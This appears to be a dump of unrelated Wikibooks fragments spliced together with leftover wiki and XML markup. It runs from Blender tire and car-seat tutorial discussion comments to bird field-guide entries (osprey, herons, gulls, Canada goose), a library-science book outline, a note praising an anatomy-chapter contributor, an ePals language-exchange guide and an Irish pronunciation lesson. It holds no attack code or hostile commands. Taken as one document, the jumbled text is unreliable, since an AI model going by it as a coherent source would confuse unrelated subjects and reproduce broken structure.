I still can't make the hubcap face the same way as the tire, help!

rotate it along one of the axis's  so put the mouse over it, LKEY, to select it all, then RKEY, and hit XKEY, YKEY, or ZKEY till the line is the one you want to rotate on..  and the move the mouse till you get it in the direction you need. [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 01:18, 8 August 2010 (UTC)

Doing this throws off the rest of the tutorial. Even with the Align to View option on. The hubcap creation view needs to be changed to NUM1 and all future axes with regards to hubcap creation need to be changed to Y.

I've fixed the view you should be in when making the hubcap, be sure to have &quot;align to view&quot; turned on! [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 13:44, 31 August 2010 (UTC)

== Inaccurate Pictures ==

The flowing pictures do not accurately reflect the steps described in the text.  It was very confusing until I figured this out and just ignored them.

http://upload.wikimedia.org/wikibooks/en/thumb/7/77/Tiretut9.png/218px-Tiretut9.png

http://upload.wikimedia.org/wikibooks/en/thumb/f/f6/Tiretut11.png/193px-Tiretut11.png

Could use either some new pictures or even remove them.

== Some notes about the tire ==


[Pro Note: It would be less messy if you extrude the region, then abort the operation with '''ESC''', then scale the new faces inward while locking the '''Global Y''' with '''SHIFT-Y'''.]
[Noob Question: Does doing it the Pro Note's way not create a slightly different shape which stops the ruggedness from working later?]

[Another method by a noob: i think a better way is to select all the vertices and in in edit mode, hit &quot;Alt+E&quot; and select &quot;Edges Only&quot; and then hit &quot;Esc&quot;. immediately after that, hit &quot;S&quot; to scale and lock the y axis by hitting &quot;Shift+Y&quot;, and then scale inward. after that, the inner vertices should be selected, hit &quot;F&quot; to create faces.]
[Another method by a noob: As I was unable to reach the result in this step (I only managed to obtain the tyre INWARDS), I did this way with a nice and similar result: 
Select the cylinder with A in '''NUM1''' view, then '''Extrude Individual''' (press button in Mesh tool) by 0.1 or 0.2 outwards.
Go in face-select mode and select all the faces in the inner part of the wire (or select one then '''CTRL-G''' and select &quot;Area&quot;) and press '''EKEY''' to extrude inwards and to create the tyre shoulder, then, after subsurf, '''SHIFT-E''' to crease the edge.]

(Another question. If im locking the global Y, the tire won't be rounded. And shouldn't i have to view the tire on top?)

-**comment** In response to the noob questions above, after playing around with my Blender v2.6 I discovered the easiest way to ensure the tire results in the picture below is this: Select all faces in face select mode, then ensure all the face normals are recalculated so that they are all pointing in the same direction (can be inwards or outwards, as long as they're all the same direction. Some faces might be pointing inwards while others are pointing outwards, this means they need to be recalculated. To check the face normals, check the &quot;Face&quot; box underneath &quot;Normals:&quot; in the &quot;Mesh Display&quot; drop down menu in the Window Tool Bar Widget which you press Nkey to show/hide (see image if needed). Once the face normals are corrected, and you have selected all faces, you can then proceed to press the SPACEBAR, bringing up the search menu (for Blender 2.59+), and type in &quot;Extrude individual faces and move&quot; then follow the directions as given below. You can do the search menu, or you can just click on &quot;Extrude Individual&quot; under &quot;Add:&quot; in the Mesh Tools bar (press TKey to show/hide). &lt;&lt; After working awhile on this Blender 2.61 you want this method.*******

[[File:BlenderFaceNormals.png|thumb|Face Normals in Blender]]


-**comment** If you do an extrusion/scale without locking global Y, then the walls of the tire will either lean inwards from the outside radius towards the inside radius -OR- lean outwards from the original radius to the now outside radius. In real life, tire walls can either be expanded outwards (as do most 4x4, snow, or street tires), or lean towards the inside of the tire (as do most low-profile tires). If you want this effect, then do not lock global Y; however, if you wanted a perfectly flat wall faces connecting each radii (the outside and inside radius) then you need to lock global Y. 

-**comment** If that's too much trouble, you can also do this by making a smaller cylinder inside the larger cylinder and then use booleans to remove the difference. Of course, then you need to include Cap Ends, which in 2.66 are called the Cap Fill Type (Default bottom left in tools (T) when you make a cylinder)

You may either type in -1.2 and hit enter, or Hold '''SHIFT CTRL''' while extruding the faces until the sides come in -1.200 units (in older versions of blender hit '''NKEY''' first) &lt;br&gt;

== Create the outside faces - FKEY ==

When I follow the instructions and press the FKEY I get very strange results. In particular he does some random triangles but not the outside faces. I tried Blender 2.67 Guess something is wrong here.?[[Special:Contributions/91.66.152.41|91.66.152.41]] ([[User talk:91.66.152.41|discuss]]) 23:36, 19 May 2013 (UTC)</text>

== Re-organizing this ==

I'm thinking about re-organizing this book, giving it a little more structure, and filling in various apparent gaps so that it's a more work-able introduction to LIS. If anyone is wedded to the current annotation format, or has a better way of organizing this, let me know, but here is my current idea for chapters:
# Contextualizing Libraries: their History and Place in the Wider Information Infrastructure
# Technology and Libraries: Impacts and Implications
# Information Policy
# Information Organization
# Re-contextualizing Libraries: Considering Libraries within their Communities
# Ethics and Values
# Transcending Boundaries: Global Issues and Trends

| level = 4

| caption_1 = A North American Osprey preparing to dive.
| call = Pandion_haliaetus.ogg‎ 
| description = The '''Osprey''', ''Pandion haliaetus'' is a medium-large raptor which is a specialist fish-eater with a worldwide distribution. It occurs in all continents except Antarctica, but in South America only as a non-breeding migrant. It is often known by other colloquial names such as '''fishhawk''', '''seahawk''' or '''Fish Eagle'''. 

The Osprey is {{units|52-60 cm| 20.5-23.6 inches}} long with a {{units|152-167 cm|5-5.5 ft}} wingspan. It has mainly white underparts and head, apart from a dark mask through the eye, and fairly uniformly brown upperparts. Its short tail and long, narrow wings with four long &quot;finger&quot; feathers (and a shorter fifth) give it a very distinctive appearance.

Juvenile birds are readily identified by the buff fringes to the upperpart plumage, buff tone to the underparts, and streaked crown. By spring, wear on the upperparts makes barring on the underwings and flight feathers a better indicator of young birds. Adult males can be distinguished from females from their slimmer bodies and narrower wings. They also have a weaker or non-existent breast band than the female, and more uniformly pale underwing coverts. It is straightforward to sex a breeding pair, but harder with individual birds.

In flight, Ospreys have arched wings and drooping &quot;hands&quot;, giving them a diagnostic gull-like appearance. The call is a series of sharp whistles, ''cheep'', ''cheep'', or ''yewk'', ''yewk''. Near the nest, a frenzied ''cheereek''!

The Osprey is particularly well adapted to its fish diet, with reversible outer toes, closable nostrils to keep out water during dives, and backwards facing scales on the talons which act as barbs to help hold its catch. It locates its prey from the air, often hovering prior to plunging feet-first into the water to seize a fish. As it rises back into flight the fish is turned head forward to reduce drag. The 'barbed' talons are such effective tools for grasping fish that, on occasion, an Osprey may be unable to release a fish that is heavier than expected. This can cause the Osprey to be pulled into the water, where it may either swim to safety or succumb to hypothermia and drown.

The osprey breeds by freshwater lakes, and sometimes on coastal brackish waters.  The nest is a large heap of sticks built in trees, rocky outcrops, telephone poles or artificial platforms. In some regions with high Osprey densities, such as Chesapeake Bay, USA, most ospreys do not start breeding until they are five to seven years old, and there may be a shortage of suitable tall structures. If there are no nesting sites available, young ospreys may be forced to delay breeding. To ease this problem, posts may be erected to provide more sites suitable for nest building.

| description = The '''Great Blue Heron''', ''Ardea herodias'', is a wading bird of the heron family, common all over North and Central America as well as the West Indies and the Galápagos Islands, except in deserts and high mountains where there is no water for it to wade in. The Great Blue Heron is the largest heron in North America.

Adults have blue-grey wings and back and a white head with a black cap and a long black plume. The face is white, with a black streak extending from behind the eye to the back of the head. They have a long neck, streaked with white, rust-brown, and black, which is generally held in a s-curve while wading, and a short tail. The beak is yellow, long, and and tapers to a point. Legs are long, and greenish-yellow in color. 

In flight, the head is held close to and aligned with the body by a downward bend in the long neck. The long legs trail behind. This bird flies with strong deliberate wing beats.

The males and females appear relatively similar, but males have a puffy plume of feathers behind their heads, and tend to be slightly larger than females.

It is found throughout most of North America, including Alaska, Quebec and Nova Scotia. The range extends south through Florida, Mexico and the Caribbean to South America. Great blue herons can be found in a range of habitats, in fresh and saltwater marshes, mangrove swamps, flooded meadows, rivers, lake edges, or shorelines, but they always live near bodies of water. Generally, they nest in trees or bushes that stand near water.

It feeds in shallow water or at the water's edge during both the night and the day, but especially around dawn and dusk. Herons locate their food by sight and generally swallow it whole. Herons have been known to choke on prey that is too large.It uses its long legs to wade through shallow water, and spears fish or frogs with its long, sharp bill. Its diet can also include insects, snakes, turtles, rodents and small birds. 

It is generally a solitary feeder. Individuals usually forage while standing in water, but will also forage in fields or drop from the air, or a perch, into water. As large wading birds, Great Blue Herons are able to feed in deeper waters, and thus are able to exploit a niche not open to most other heron species.

This species usually breeds in colonies, in trees close to lakes or other wetlands; often with other species of herons.  These groups are called heronry (more accurately than &quot;rookery&quot;). The size of these colonies may be large, ranging between 5 – 500 nests per colony, with an average of approximately 160 nests per colony. 

Great Blues build a bulky stick nest, and the female lays three to six pale blue eggs. One brood is raised each year.  If the nest is abandoned or destroyed, the female may lay a replacement clutch. Reproduction is negatively affected by human disturbance, particularly during the beginning of nesting. Repeated human intrusion into nesting areas often results in nest failure, with abandonment of eggs or chicks.

Both parents feed the young at the nest by regurgitating food. Parent birds have been shown to consume up to 4 times as much food when they are feeding young chicks than when laying or incubating eggs.

Eggs are incubated for approximately 28 days and hatch over a period of several days. The first chick to hatch usually becomes more experienced in food handling and aggressive interactions with siblings, and so often grows more quickly than the other chicks.

Birds east of the Rocky Mountains in the northern part of their range are bird migratory and winter in Central America or northern South America. From the southern United States southwards and on the Pacific coast, they are year-round residents.

      <text xml:space="preserve">== Extruding the seat ==
Like others when I did it the first time, and extruded in &quot;vertex&quot; selection mode, and picked &quot;regions&quot;, the loop cut made a funny triangle shape on the back of the original cube, this is because I was extruding regions, and had created alot of doubles, some with  reversed normals.

A better way to do this and not create doubles is to go into &quot;Face&quot; selection mode, then you will be extruding faces, and not wind up with a ton of doubles, some of which will have the wrong normal’s, and make your loop cut act funny.

If you insist on using edge mode, or vertex mode, you want to only pick &quot;Faces&quot; from the popup menu that appears after you hit the '''EKEY''', this will stop the doubles from appearing. If you don't see '''Faces''' on this menu then you are really extruding from doubles with reversed normal’s, so go and remove them ( W -&gt; remove doubles ) before continuing to extrude.

==Yoshi's Addition (leather look)==

After subsurfing to give the seams a leathery cord look. Hit A to select all then W and Subdivide Fractal and just keep the defaults and the seams will look like a bunch of vines until you render it and they look like leather seams .

== older issues caused by doubles, or interor faces, during extrusion ==

In blender 2.45, I tried getting into the wireframe mode, but didn't find any internal faces. Maybe they don't exist in all cases. [[User:MSK61|MSK61]] ([[User talk:MSK61|talk]]) 16:20, 12 May 2008 (UTC)


----
I also use Blender 2.45 but I managed to find some internal faces (in the loops) and deleting these really did clear everything up. I was already wondering why my model looked so wrong.


----
Viewer: Selecting all(AKEY)Pressing WKEY and selecting &quot;Set Smooth&quot; helped me a lot in the looks.

----
Noob note: You should remove doubles at this point ('''TAB''' to edit mode &gt; '''WKEY''' &gt; Remove Doubles).  When I removed doubles before adding the loop cuts, I found that they did not loop around the bottom of the seat correctly, and when I did not remove the doubles at all, I had trouble forming the seams in the next few steps.


----------------------------------------
Noob note: I had to remove all faces inside my seat before loop cut works (and in object mode I join all faces Ctrl+J)


------------------------------
Noob note: Also you could try deleting faces and edges which are unused ''inside'' the object (seat) this way there are no edges to cut up the loop into lots of different sections, so now you will have one clean loop :)


------------------------------
When I tried to subsurface I had the problem that my extruded cubes only subsurfaced smoothly into the cubes that they were extruded from. I wound up with big dents in between the different sections of the seat (it actually came out looking like a pretty good hand) and I have so far been unable to remove them)

Try selecting all vertices (AKEY) and remove all doubles before applying the subsurf mod, this helped in my case...)

User: Thank you that did fix my problem. My seat still needs a lot of work with creasing to look like the final picture but at least it isn't a deformed hand anymore)
end user feedback.[[User:Feureau|Feureau]] 00:24, 24 March 2007 (UTC)


-------------
I am having a terrible time with loop cutting on this project.  I could do it fine during the dice tutorial. And after extruding the multiple cubes for the car seat, setting edge mode, selecting ctrl-Rkey, and hitting the 4key, the four parallel lines loop cut lines are still fine.  Once I hit &lt;Enter&gt; or LClick however, all loop cut lines suddenly run symmetrically at an angle towards adjacent vertices.  I've tried doing a loop cut after each step, which usually works fine.  What I can't figure out exactly is why and when the loop cut changes in this way.

2008-07-19, Same problem as the user above (I'm using blender 2.46). I used the multicut tool instead. I have no idea why the loopcut didn't work. 


------------------
I'm little confused when it comes to loop subdivide... First of all after creating whole seat I hit &quot;remove doubles&quot;... Then loop subdivide didn't work as it suppose to (it took me about 30 min to realize it...). When I thought that I can't remove doubles before loop subdividing I would like to know how to add loops to all blocks in the center instead of hitting ctrl + r to every single block?

Ctrl + R (cut) started to work properly when I extruded regions only (Blender 2.48a).

------------------
I moved the following user comment here because I think it does not belong to the articel, since loop cut does work in 2.6x, [[Special:Contributions/91.66.152.41|91.66.152.41]] ([[User talk:91.66.152.41|discuss]]) 10:41, 20 May 2013 (UTC):

Version 2.60 user comment: I tried several different edge loop, loop cut, loop subdivide, etc. to no avail, so I selected all the edges of the middle portion of the object (seat) using box select, then I Knife Cut (hold down Kkey and LMB through the front view of the edges from top to bottom. Select multi-cut and number of cuts to 4.</text>

| description = The '''Great Egret''' ''Ardea alba'', also known as the '''Great White Egret''', '''White Heron''', or '''Common Egret''',  is a wading egret, found in most of the tropical and warmer temperate parts of the world, although it is very local in southern Europe and Asia.  It is called '''Kōtuku''' in New Zealand.  It should not be confused with the Great White Heron, which is a white morph of the Great Blue Heron found in Florida.

The Great Egret is a large bird with all white plumage, as much as {{units|101 cm|40 in}} long and weighing up to {{units|950 grams|2 lbs}}. It is only slightly smaller than the Great Blue or Grey Herons. Apart from size, the Great Egret can be distinguished from other white egrets by its yellow bill and black legs and feet. It also has a slow flight, with its neck retracted. This is characteristic of herons and bitterns, and distinguishes them from storks, cranes and spoonbills, which extend their necks.

The Great Egret feeds in shallow water or drier habitats, spearing fish, frogs or insects with its long, sharp bill. It will often wait motionless for prey, or slowly stalk its victim. It is a conspicuous species, usually easily seen.

The Great Egret is partially migratory, with northern hemisphere birds moving south from areas with cold winters. It breeds in colonies in trees close to large lakes with reed beds or other extensive wetlands. It builds a bulky stick nest.  The call at breeding colonies is a loud croaking &quot;cuk cuk cuk&quot;.

| description = The '''Herring Gull''', ''Larus argentatus'', is a large gull which breeds across North America, Europe and Asia. Some herring gulls, especially those resident in colder areas, migrate further south in winter, but many are permanent residents, e.g. those on the lower Great Lakes, on the east coast of North America or at the North Sea shores.  Herring Gulls are also abundant around inland garbage dumps, and some have even adapted to life in inland cities.

Adult Herring Gulls are similar to Ring-billed Gulls but are much larger, have pinkish legs, and a much thicker yellow bill with more pronounced lower bill. First-winter Herring Gulls are much browner, but second and third-winter birds can be confusing since soft part colors are variable and third-year Herring Gull often show a ring around the bill. Such birds are most easily distinguished by the larger size and larger bill of Herring Gull.

Adults are easily identified by their size, pale grey back and the red spot on the beak. Legs are pink at all ages. The bird depicted is the western European race ''Larus argentatus argenteus''.  The Scandinavian race ''L. a. argentatus'' is slightly larger and darker, with more white in the wing tips.

The North American '''American Herring Gull''' is similar to ''argentatus'', except that immature birds tend to be darker and more uniformly brown.

These are omnivores like most ''Larus'' gulls, and will scavenge on rubbish tips and elsewhere, as well as seeking suitable small prey in fields or on the coast, or robbing plovers or lapwings of their catches.

Eggs, usually three, are laid on the ground or cliff ledges in colonies, and are defended vigorously by this large gull.  The loud laughing call is well-known in the northern hemisphere.

Brianna,

I appreciate how you have really taken the lead on the urinary system chapter and that you have been bold about making changes for the better. It seems that sometimes sections of the book progress in bits and pieces as people make minor edits, but then someone comes along and really has a vision of where to take the chapter. You seem to have developed a vision for this chapter, and I encourage you to take it as far as you like. Also, feel free to post thoughts on the discussion tab about what you think could be done to improve the chapter, so that other people can see a place to jump in, or so that other people can engage in a dialog with you.

Keep up the great work!

Some are hard to distinguish from the Cackling Goose (''Branta hutchinsii''), with which the Canada Goose was long assumed to form one species; the name Lesser Canada Goose is, confusingly, often applied to ''B. hutchinsii''.

This species is 90-100 cm long with a 160-175 cm wing span. Males weigh {{units|3.5–6.5 kg|8–14 pounds}}, and can be very aggressive in defending territory. The female looks virtually identical but is slightly lighter at {{units|3–5.5 kg|7–12 pounds}}, and has a different honk. Exceptionally, weights of {{units|11.3 kg|25 pounds}} and a wingspan of {{units|224 cm|88 inches}} have been recorded in the largest race.

These birds feed mainly on plant material. When feeding in water, they submerge their heads and necks to reach aquatic plants, sometimes tipping forward like a dabbling duck. Flocks of these birds often feed on leftover cultivated grains in fields, especially during migration or in winter.

During the second year of their lives, Canada Geese find themselves a mate. Most couples stay together all of their lives. If one is killed, the other may find a new mate. The female lays 4-8 eggs and both parents protect the nest while the eggs incubate, but the female spends more time at the nest than the male. During that time, they lose their flight feathers, so that they cannot fly until after their eggs hatch. This period lasts for 25-28 days.

Adult geese are often seen leading their goslings in a line, usually with one parent at the front, and the other at the back of the &quot;parade&quot;. While protecting their young, parents often violently chase away nearby creatures, from small blackbirds to other geese, to humans that approach, after warning them by giving off a hissing sound.  The young do not leave their parents until after the spring migration, when they return to their birthplace.

This well-known species is native to North America. It breeds in Canada and the northern United States in a variety of habitats. However, the nest is usually located in an elevated area near water, sometimes on a beaver lodge. The eggs are laid in a shallow depression lined with plant material and down. The Great Lakes region maintains a very large population of Canada Geese.

Like most geese, the Canada goose is naturally migratory with the wintering range being most of the United States. The calls overhead from large groups of Canada Geese flying in V-shaped formation signal the transitions into spring and autumn. In some areas, migration routes have changed due to changes in habitat and food sources. In mild climates, such as the Pacific Northwest, due to a lack of former predators, some of the population has become non-migratory.

| description = The '''Semipalmated Sandpiper''', ''Calidris'' or ''Erolia pusilla'', is a very small shorebird.

Adults have black legs and a short stout straight dark bill. The body is dark grey-brown on top and white underneath. The head and neck are tinged light grey-brown. This bird can be difficult to distinguish from other similar tiny shorebirds, in particular the Western Sandpiper; these are known collectively as &quot;peeps&quot; or &quot;stints&quot;.

Their breeding habitat is the southern tundra in Canada and Alaska near water. They nest on the ground. The male makes several shallow scrapes, the female chooses one and adds grass and other material to line the nest. The female lays 4 eggs; the male assists in incubation. After a few days, the female leaves the young with the male; the young feed themselves.

They are long distance migrants and winter in coastal South America with some going to the southern United States. They migrate in flocks which can number in the hundreds of thousands, particularly in favored  feeding locations such as the Bay of Fundy and Delaware Bay. This species is a rare but regular vagrant to western Europe.

These birds forage on mudflats, picking up food by sight and feel (bill). They mainly eat aquatic insects and crustaceans.

Although very numerous, these birds are highly dependent on a few key stopover habitats during their migration, notably, Shepody Bay, an arm of the Bay of Fundy.

During the months of July and August you can go to one of two information centers run by the Nature Conservancy of Canada about the shorebirds in either Johnson's Mills or Mary's point.

      <text xml:space="preserve">== ePals eTandem Overview ==
''ePals enables teachers, leaders of language groups, or even parents to find a group of native speakers of their target language (the language they are learning) for interaction.  This package explains the steps of finding, creating, and running a successful language exchange through ePals, primarily as a foreign language instructor.''
;Muti-Language Classroom Connection : Giving students the opportunity to have authentic conversations with native speakers of the language they are learning improves motivation, understanding, and practice.  Imagine the rebellious student that does not care about his/her grade suddenly asking the teacher how to say certain phrases because he/she wants to communicate with a new-found friend in another country?  Languages were created for interaction and expression between human beings, and giving students the opportunity to use the new language with real people lets them experience an actual purpose to their learning.  Otherwise, the target language may just feel like a useless list of vocabulary words that they never envision themselves needing or even using.
;What is ePals? : ePals provides free forum and filtered e-mail services to help instructors connect with other classrooms and securely monitor communication between students.  Anyone can create a profile detailing the age group, size, and type of language exchange desired.  Forums are then used as post-it boards to aid the search for a match.  One a match is found, the leader of a group can create &quot;monitored e-mail accounts&quot; for his/her students or members.  Different filtering levels allow the leader have control from message by message approval to completely free-flowing exchanges.  A built in translator including seven different languages is provided as well.

===Before Getting Started - Precautions &amp; Legal Issues===
''Although this section may sound intimidating, it is merely a reminder to approach virtual connections such as ePals with the proper level of caution.  The internet provides access to endless resources and means of communication, both positive and negative.  As a leader of the language exchange, one must lookout for the safety of her/himself and the participants he/she is responsible for.''

== History ==
The Irish language belongs to the family of Celtic languages.
By the 5th century B.C., the Celtic tribes occupied much of Europe.
The word &quot;Celt&quot; is derived from the Greek name for these tribes, &quot;Keltoi&quot; (meaning &quot;secret people&quot;).
The Celtic languages evolved from Indo-European, which is the common ancestor of many of the languages in Europe and southern Asia.

The development of the Celtic languages is illustrated below.
Eventually the forms of the Celtic languages spoken on the continent died out, leaving only the insular forms.
At some point, the insular Celtic language divided into &quot;q-Celtic&quot; or Goidelic (from Goidel 'Gael'), which retained the original Indo-European q sound, and &quot;p-Celtic&quot; Brythonic (from Brython 'Briton'), which replaced the q sound with a p sound.

The modern Celtic languages are Irish, Scottish Gaelic, Manx, Welsh, Cornish, and Breton. You will note that the term &quot;Gaelic&quot; is only applied to Irish, Scottish Gaelic, and [[Wikijunior_Languages/Manx_Gaelic|Manx]].

[[Image:Indo-european to irish flow-chart.png]]
     
The history of Irish may be divided into the following periods:

* Old Irish (C.E.  600-900)
* Middle Irish (C.E.  900-1200)
* Early Modern Irish (C.E.  1200-1600)
* Modern Irish

== Alphabet - An Aibítir==
{{Wikipedia|Gaelic script}}
Irish uses the Latin alphabet. The basic alphabet consists of 18 letters:

a, b, c, d, e, f, g, h, i, l, m, n, o, p, r, s, t, u

Variations of a, e, i, o and u written with an acute accent (Irish: ''Síneadh fada'' or just ''fada'' for short) also exist in Irish. They denote both a longer pronunciation and a different vowel quality:

Á á, É é, Í í, Ó ó, Ú ú 

In addition to these letters others are used in words borrowed from other languages.
The letters are usually called by their English names, except that the letter '''a''' is called &quot;ah&quot;. The names of the vowels with accents take the formula &quot;name of vowel&quot; + &quot;''fada'', thus the name &quot;''Ciarán'' would be spelt out load as &quot;C, I, A, R, A-fada, N&quot;.


When books were first printed in Irish Type, the fonts used were based on the handwritten scripts of the time (16th Century) as they were for all other languages. A feature of the Irish manuscripts was the use of special marks to indicate sounds that were not well represented with Roman letters. The most common mark was used to indicate the softening of a consonant by putting a dot above the consonant. (This is similar to the umlaut in German, which represents a vowel vocalised forward of its usual location in the mouth.) This is known in Irish as a seimhiú (softening); grammarians call it lenition. It was also known as &quot;buailte&quot; - struck. There were very few books published in Irish until the Irish Language Revival started in the late 19th/early 20th Century. Up until the 1960s, most books were printed using fonts modelled on uncial handwriting.  Eventually these were replaced by the Latin fonts for reasons of practicality with the dot above the letter replaced by a 'h' after the letter, but the Gaelic script is still used decoratively. With the ease of use of true type fonts on PCs the old fonts, known as &quot;seanchló&quot; (Old Type) or Cló Gaelach (Gaelic Type) have undergone a renaissance.

==The Old Spelling and Punctum Delens: A Note - An Seanlitriú agus an Ponc Séimhithe: Tabhair faoi Deara!==

Until the end of the nineteen forties, Irish was printed in a special typeface called Gaelic type, essentially a printed representation of medieval manuscript letters. A salient feature of this type was the punctum delens, a dot over a consonant letter, such as ċ or ġ. In contemporary Irish, the punctum delens isn't used any more. The punctum delens was used in order to indicate a modification of pronunciation called ''séimhiú'' or '''lenition''' (in older textbooks, it was mistakenly called aspiration, which is in proper linguistic usage something entirely different). It could appear over the letters b, c, d, f, g, m, p, s, and t. Nowadays, lenition is indicated by adding a h after the lenited consonant.

The Gaelic typeface and punctum delens are strongly linked with the older spelling, which was less phonetic than the spelling we use today, and more about being historically correct. Thus, it was cluttered with mute letters. Modern spelling can be used with the Gaelic typeface and punctum delens, but this is extremely rare - mostly you can count on all books in Gaelic type being in the old spelling. In fact, there seems to be just one book around printed in Gaelic type with punctum delens, but using a modern spelling - Niall Ó Dónaill's ''Na Glúnta Rosannacha''.

== Spelling ==
{{Wikipedia|Irish orthography}}
=== Broad and Slender ===

Each consonant letter in Irish can represent two different consonant sounds, called  broad and slender. This is a phenomenon unique to the Gaelic orthography, but with some parallels in other languages, Russian, for example. Vowels decide whether a consonant falls into either of these categories. 

*   A consonant preceded or followed by the vowels '''a''', '''o''', or '''u''' is a broad consonant. 
*   A consonant preceded or followed by '''i''' or '''e''' is described as slender.

In practice, this means that when a novice sees a word like &quot;Lian&quot;, it's clear that the L is a slender consonant and the n a broad consonant, but you can't tell whether the vowel sound is an A and the letter I has been added just to show that the L is slender, or the vowel sound is an I and the A has been added to show that the N is broad. You must ask a native speaker, or use a dictionary showing IPA transcriptions.

=== Caol le caol agus leathan le leathan ===

The golden rule for spelling in Irish,
'''caol le caol agus leathan le leathan'''
means ''slender with slender and broad with broad''.
The rule says that the vowels on either side of a
consonant (or group of consonants) should agree;
they should both be broad or both be slender.
The rule is primarily used when you add an ending to a word (e.g., when conjugating a verb).
To satisfy the rule you may need to add a vowel between the word and its ending.
Note that there are a few common words (such as ''ansin'' and ''anseo'') that do not satisfy this rule. However, the diphthong &quot;ae&quot; is considered broad, making words such as &quot;Gaeltacht&quot; and &quot;aerfort&quot; perfectly acceptable.


{{Example|1=
Even without knowing a single word of Irish, you can apply the rule to catch many spelling mistakes!
Let's try a few examples:
; f&lt;span style=&quot;color:green&quot;&gt;olú&lt;/span&gt;s :Focus on the consonant in the center, '''l''', and look at the vowels immediately before and after. The vowel before, '''o''', is broad, and so is the vowel after, '''ú'''. This word follows the rule, so there aren't any obvious spelling mistakes here. (In fact, it is spelled correctly.)

; gl&lt;span style=&quot;color:green&quot;&gt;acfi&lt;/span&gt;dh :Focus on the consonant group in the center, '''cf''', and look at the vowels '''immediately''' before and after. The vowel before, '''a''' is broad, but the vowel after, '''i''' is slender. This looks like a mistake! (In fact, the '''correct''' spelling is gl'''acfa'''idh).

; ti&lt;span style=&quot;color:green&quot;&gt;ocfa&lt;/span&gt;idh :The flanking vowels, '''o''' and '''a''' are both broad, so this word follows the rule.

; chru&lt;span style=&quot;color:green&quot;&gt;inne&lt;/span&gt;oinn : The flanking vowels, '''i''' and '''e''' are both slender, so this word follows the rule.

; dó&lt;span style=&quot;color:green&quot;&gt;ima&lt;/span&gt;id : Uh oh! The vowel before, '''i''', is slender, but the vowel after, '''a''' is broad. (In fact, the '''correct''' spelling is dó'''imi'''d).

== Pronunciation - An Fuaimniú==

{{Wikipedia|Irish phonology}}
Irish spelling often baffles the beginner. Much of this can be attributed to the complete difference between pronunciations in Irish and English.


*'''mh''' at the start of a word is pronounced as a w - e.g. mo mhála (my bag) is pronounced mu wall-ah (/mˠʊ ˈwaːl̪ˠə/).
*'''mh''' in the centre of a word is pronounced as a v sound - e.g. nimh (poison) is pronounced niv (/nʲɪvʲ/)
*'''bh''' is pronouced as a v sound - e.g. sa bhearna (in the gap) is pronounced sa varna (/sˠa ˈvaɾˠn̪ˠə/)

Note: The Pronunciation of mh or bh varies regionally.  In Ulster the General rule is that they are pronounced w when broad and v when narrow.  In Munster (as in the Western isles of Scotland) the tendency is to pronounce as v at the beginning or the end of a word and w in the middle.  I've never been able to figure out exactly how it works in Connacht. e.g. the final syllable of Gaillimh (Galway) is pronounced &quot;ih&quot; in Galway but &quot;iv&quot; in Donegal or Kerry.  Within the regional variations there are also local variations I have heard in Munster both Abhainn (river) and amháin (sole, single or only) pronounced with a v sound.  surnames and personal names may not always follow the &quot;rules&quot; either. The standard pronunciation of Siobhán (Shivaun approx) does not correspond to any modern regional pattern.  The alternative pronunciation &quot;shoe-un&quot; (approx) exists in Munster and Ulster.  To the Gaelic ear the sounds are, to a degree, interchangeable.

Examples

bó = a cow             beo = alive
The broad b is pronounced almost as if it were &quot;bw&quot; (/bˠ/) or something like the ''b'' in the English word &quot;but&quot; (as pronounced in Ireland), using  both lips, as if you were about to kiss someone!

The slender b is pronounced sometimes as if in the Scandinavian Bjorn (/bʲ/) for example or like the b in English bet. The lips are tenser, almost as if you were tightening them in exasperation.

==Stress - An Bhéim==

Stress is in Irish usually on the first syllable, except in the southernmost (Munster) dialects, where non-initial syllables are usually stressed, if they include a long vowel or a short a followed by -/ch/. Thus, a word such as ''díreach'' = &quot;direct, straight&quot; can in Munster dialect be stressed on the second syllable.

Some borrowed words, notably ''tobac'' = &quot;tobacco&quot; are stressed on the second syllable. There are also quite a few of common adverbs which are so stressed, above all these:

:''abhaile'' &quot;home&quot; (movement)
:''abhus'' &quot;on this side&quot;
:''aduaidh'' &quot;from the north&quot; (&quot;northward&quot; is ''ó thuaidh'', &quot;in the north&quot; is ''thuaidh'', and &quot;the North&quot; is ''an Tuaisceart'')
:''amach'' &quot;out&quot; (movement)
:''amuigh'' &quot;out&quot; (state)
:''amainiris'' &quot;the second day after tomorrow&quot;
:''amanathar'' &quot;the day after tomorrow&quot; (''arú amárach'' is probably more common)
:''amárach'' (dialectally even ''amáireach'') &quot;tomorrow&quot;
:''anall'' &quot;from the other side, to this side&quot;
:''aneas'' &quot;from the south&quot; (&quot;southward&quot; is ''ó dheas'', &quot;in the south&quot; is ''theas'', and &quot;the South&quot; is ''an Deisceart'')
:''aniar'' &quot;from the west&quot; (&quot;westward&quot; is ''siar'', &quot;in the west&quot; is ''thiar'', and &quot;the West&quot; is ''an tIarthar'')
:''anocht'' &quot;tonight&quot;
:''anoir'' &quot;from the east&quot; (&quot;eastward&quot; is ''soir'', &quot;in the east&quot; is ''thoir'', and &quot;the East&quot; is ''an tOirthear'')
:''anóirthear'' (dialectally in Ulster even ''anóirtheal'') &quot;the day after tomorrow&quot;; also &quot;the second day after&quot; - i.e. the second day after what happened last, in a narrative
:''anonn'' &quot;from this side, to the other side&quot;
:''anseo'' (in Munster, ''anso'') &quot;here&quot;
:''ansin'' (in Munster, ''ansan'') &quot;there&quot;
:''ansiúd'' (in Munster, ''ansúd'') &quot;out there, yonder&quot;
:''anuraidh'' &quot;last year&quot;
:''aréir'' (in some Ulster dialects, ''aréireannas, aréirnas'') &quot;last night&quot;
:''arú'' is an adverb that is added to ''amárach'' &quot;tomorrow&quot; and ''inné'' &quot;yesterday&quot; to create ''arú amárach'' = &quot;the day after tomorrow&quot; and ''arú inné'' = &quot;the day before yesterday&quot;
:''inné'' &quot;yesterday&quot;
:''inniu'' &quot;today&quot;
:''isteach'' &quot;in&quot; (movement)
:''istigh'' &quot;in&quot; (state)
:''laisteas'' &quot;southside&quot; (also ''taobh theas'')
:''laistigh'' &quot;inside&quot; (also ''taobh istigh'')
:''lasmuigh'' &quot;outside&quot; (also ''taobh amuigh'')
:''lastuas'' &quot;overhead&quot; (also ''taobh thuas'')
:''laistíos'' &quot;below&quot; (also ''taobh thíos'')

